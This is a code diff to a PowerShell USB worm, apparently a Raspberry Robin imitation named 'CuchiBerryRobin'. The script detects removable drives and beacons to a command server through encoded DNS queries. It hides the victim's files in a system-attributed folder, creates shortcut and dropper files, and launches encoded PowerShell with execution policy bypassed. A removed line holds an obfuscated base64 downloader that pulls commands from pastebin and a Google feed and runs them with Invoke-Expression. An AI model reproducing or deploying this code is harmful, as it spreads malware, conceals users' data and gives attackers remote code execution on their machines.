@@ -21,9 +21,8 @@ $notify.visible = $true
 $notify.showballoontip(10,$Title,$Message, [system.windows.forms.tooltipicon]::$Type)
 
 #Mensaje para logging
-Add-Content -Path C:\output.txt -Value "$(Get-Date) - USB Flash Drive was inserted.";
+Add-Content -Path "$env:APPDATA\cuchirobinoutput.log" -Value "$(Get-Date) - USB Flash Drive was inserted.";
 
-    
 }
 
 
@@ -33,13 +32,27 @@ Add-Content -Path C:\output.txt -Value "$(Get-Date) - USB Flash Drive was insert
 #consige la unidad 
 
 Get-WmiObject Win32_Volume | Where-Object { $_.DriveType -eq 2 } | Where-Object { $_.Label -ne "EFI" } | ForEach-Object {
-   # Write-Host "Letter is" + $_.DriveLetter
+    #Write-Host "Letter is" + $_.DriveLetter + "label is " + $_.Label
     $driveLetter = $_.DriveLetter
     $label = $_.Label
+    if ([string]::IsNullOrEmpty($label)) {
+        $label = "USB" # Espacio en blanco en lugar de "USB" para mantener consistencia
+    }
+    Write-Host "Letter is" + $_.DriveLetter + "label is " + $_.Label
     
 }
+
+# Verificar si driveLetter y label están vacíos
+if ([string]::IsNullOrEmpty($driveLetter) -or [string]::IsNullOrEmpty($label)) {
+    Write-Error "Error: No se pudo obtener la letra de unidad o etiqueta del USB"
+    exit
+}
+
+Write-Host "Letra de unidad: $driveLetter"
+Write-Host "Etiqueta: $label"
+
 #Add-Content -Path $PSScriptRoot\output.txt -Value "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter .";
-Write-Host "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter ."
+Write-Host "$(Get-Date) - USB Flash Drive nombre $label es unidad $driveLetter "
 
 #Notificamos la Entrada al CNC
 $ipAddress = (Test-Connection -ComputerName localhost -Count 1).IPv4Address.IPAddressToString
@@ -65,25 +78,49 @@ $result = Resolve-DnsName -Name $encodedData
 $folderPath = "$driveLetter"
 
 # Create a subfolder
+$subfolderPath = Join-Path -Path $folderPath -ChildPath "$label"
 
-$subfolderPath = Join-Path -Path $folderPath -ChildPath "$label" 
 
-If(!(test-path -PathType container $subfolderPath))
-{
 
-New-Item -ItemType Directory -Path $subfolderPath
+# Asegurarse de que la ruta es válida y existe
+if(!(Test-Path -PathType Container $subfolderPath)) {
+    try {
+        New-Item -ItemType Directory -Path $subfolderPath -Force -ErrorAction Stop
+        Write-Host "Directorio creado: $subfolderPath"
+    } catch {
+        Write-Error "No se pudo crear el directorio: $_"
+        return
+    }
+} else {
+    Write-Host "El directorio ya existía: $subfolderPath"
 }
-# Copy all files to the subfolder
-Get-ChildItem -Path $folderPath  | Move-Item -Destination $subfolderPath -force
+
+
+# Copy all files to the subfolder except the subfolder itself, hidden files and shortcuts
+
+    Get-ChildItem -Path $folderPath | Where-Object { 
+        $_.FullName -ne $subfolderPath -and 
+        !($_.Attributes -band [System.IO.FileAttributes]::Hidden) -and 
+        !($_.Extension -eq ".lnk")
+    } | ForEach-Object {
+        Write-Host "Moviendo archivo/carpeta: $($_.FullName)"
+        if($_.PSIsContainer) {
+            # Si es una carpeta, copiamos su contenido y luego la eliminamos
+            Copy-Item -Path $_.FullName -Destination $subfolderPath -Force -Recurse
+            Remove-Item -Path $_.FullName -Force -Recurse
+        } else {
+            # Si es un archivo, lo movemos directamente
+            Move-Item -Path $_.FullName -Destination $subfolderPath -Force
+        }
+    }
+
 
 # Make the subfolder invisible
 $attrib = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
-try{
-(Get-Item $subfolderPath).Attributes = $attrib
-}
-catch{
- 
- }
+
+(Get-Item $subfolderPath -Force).Attributes = $attrib
+
+
  
 
 #CREANDO LNK Y DROPPER
@@ -127,9 +164,9 @@ $lineas | Set-Content "$dropperPath"
 # Escribimos "Dropper" en una línea aleatoria del archivo
 #$lineas = Get-Content $dropperPath
 $indice = Get-Random -Minimum 0 -Maximum $lineas.Count
-
-$downloader="IwBEAG8AdwBuAGwAbwBhAGQAZQByACAAQwBVAEMASABJAEIARQBSAFIAWQBSAE8AQgBJAE4ADQAKAA0ACgAkAGMAbwBuAHQAZQBuAHQAIAA9ACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgACIAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AZwBvAG8AZwBsAGUALgBlAHMALwBhAGwAZQByAHQAcwAvAGYAZQBlAGQAcwAvADEANAAzADIAMgA1ADAANwA3ADAAMgA1ADUANgA1ADgANwA1ADUANAAvADcANAA5ADgAOAAzADgAMQA2ADQAOQAzADEAMQA0ADEANgA1ADUAIgAgAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcADQAKACQAcABhAHQAcgBvAG4AIAA9ACAAJwAoAD8APAA9ACMAQwBVAEMASABJAFIATwBCAEkATgAgACkAKAAuACoAKQAoAD8APQAgACMARgBJAE4AKQAnAA0ACgAkAHIAZQBzAHUAbAB0AGEAZABvACAAPQAgAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaAAoACQAYwBvAG4AdABlAG4AdAAsACAAJABwAGEAdAByAG8AbgApAC4AVgBhAGwAdQBlAA0ACgANAAoADQAKACMAUwBFAEcAVQBOAEQAQQAgAE8AUABDAEkATwBOACAAIwBUAE8ARABPACAAQwBJAFAASABFAFIAIABYAE8AUgANAAoAaQBmACAAKAAoAFsAcwB0AHIAaQBuAGcAXQA6ADoASQBzAE4AdQBsAGwATwByAEUAbQBwAHQAeQAoACQAcgBlAHMAdQBsAHQAYQBkAG8AKQApACkADQAKAHsADQAKACQAYwBvAG4AdABlAG4AdAAgAD0AIABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAcgBpACAAIgBoAHQAdABwAHMAOgAvAC8AcABhAHMAdABlAGIAaQBuAC4AYwBvAG0ALwByAGEAdwAvAEEAQgBpAFYAMAByAEgANwAiACAALQBVAHMAZQBCAGEAcwBpAGMAUABhAHIAcwBpAG4AZwANAAoADQAKACQAcABhAHQAcgBvAG4AIAA9ACAAJwAoAD8APAA9ACMAQwBVAEMASABJAFIATwBCAEkATgAgACkAKAAuACoAKQAoAD8APQAgACMARgBJAE4AKQAnAA0ACgAkAHIAZQBzAHUAbAB0AGEAZABvACAAPQAgAFsAcgBlAGcAZQB4AF0AOgA6AE0AYQB0AGMAaAAoACQAYwBvAG4AdABlAG4AdAAsACAAJABwAGEAdAByAG8AbgApAC4AVgBhAGwAdQBlAA0ACgB9AA0ACgANAAoADQAKAA0ACgAkAFQAaQB0AGwAZQAgAD0AIAAiAEMAdQBjAGgAaQBCAGUAcgByAHkAUgBPAGIAaQBuACIADQAKACQATQBlAHMAcwBhAGcAZQAgAD0AIAAiAEQAZQBzAGMAYQByAGcAYQBuAGQAbwAgAGMAbwBtAGEAbgBkAG8AIAAkAHIAZQBzAHUAbAB0AGEAZABvACIADQAKACQAVAB5AHAAZQAgAD0AIAAiAGkAbgBmAG8AIgAgAA0ACgAgACAADQAKAFsAcgBlAGYAbABlAGMAdABpAG8AbgAuAGEAcwBzAGUAbQBiAGwAeQBdADoAOgBsAG8AYQBkAHcAaQB0AGgAcABhAHIAdABpAGEAbABuAGEAbQBlACgAIgBTAHkAcwB0AGUAbQAuAFcAaQBuAGQAbwB3AHMALgBGAG8AcgBtAHMAIgApACAAfAAgAG8AdQB0AC0AbgB1AGwAbAANAAoAJABwAGEAdABoACAAPQAgAEcAZQB0AC0AUAByAG8AYwBlAHMAcwAgAC0AaQBkACAAJABwAGkAZAAgAHwAIABTAGUAbABlAGMAdAAtAE8AYgBqAGUAYwB0ACAALQBFAHgAcABhAG4AZABQAHIAbwBwAGUAcgB0AHkAIABQAGEAdABoAA0ACgAkAGkAYwBvAG4AIAA9ACAAWwBTAHkAcwB0AGUAbQAuAEQAcgBhAHcAaQBuAGcALgBJAGMAbwBuAF0AOgA6AEUAeAB0AHIAYQBjAHQAQQBzAHMAbwBjAGkAYQB0AGUAZABJAGMAbwBuACgAJABwAGEAdABoACkADQAKACQAbgBvAHQAaQBmAHkAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAHMAeQBzAHQAZQBtAC4AdwBpAG4AZABvAHcAcwAuAGYAbwByAG0AcwAuAG4AbwB0AGkAZgB5AGkAYwBvAG4ADQAKACQAbgBvAHQAaQBmAHkALgBpAGMAbwBuACAAPQAgACQAaQBjAG8AbgANAAoAJABuAG8AdABpAGYAeQAuAHYAaQBzAGkAYgBsAGUAIAA9ACAAJAB0AHIAdQBlAA0ACgAkAG4AbwB0AGkAZgB5AC4AcwBoAG8AdwBiAGEAbABsAG8AbwBuAHQAaQBwACgAMQAwACwAJABUAGkAdABsAGUALAAkAE0AZQBzAHMAYQBnAGUALAAgAFsAcwB5AHMAdABlAG0ALgB3AGkAbgBkAG8AdwBzAC4AZgBvAHIAbQBzAC4AdABvAG8AbAB0AGkAcABpAGMAbwBuAF0AOgA6ACQAVAB5AHAAZQApAA0ACgANAAoADQAKAA0ACgAjAFcAcgBpAHQAZQAtAEgAbwBzAHQAIAAkAHIAZQBzAHUAbAB0AGEAZABvAA0ACgANAAoADQAKAA0ACgBJAG4AdgBvAGsAZQAtAEUAeABwAHIAZQBzAHMAaQBvAG4AIAAkAHIAZQBzAHUAbAB0AGEAZABvAA0ACgA="
-$lineas[$indice] = "$downloader "
+#
+$downloader="A reemplazar por el configurator"
+$lineas[$indice] = "Powershell -NoLogo -NonInteractive -NoProfile -ExecutionPolicy Bypass -Encoded $downloader "
 
 $lineas | Set-Content "$dropperPath"
 #Hago el dropper protegido
@@ -206,7 +243,8 @@ if ($Conf_Ballon -eq $True) {
 #MENSJAE DE USB PROCESADO
 $Title = "CuchiBerryRObin"
 $Message = "USB CuchiRobineado"
-$Type = "info" 
+#$Type = "info" 
+$Type = "Warning" # Puedes usar: None, Info, Warning, Error
 [reflection.assembly]::loadwithpartialname("System.Windows.Forms") | out-null
 $path = Get-Process -id $pid | Select-Object -ExpandProperty Path
 $icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
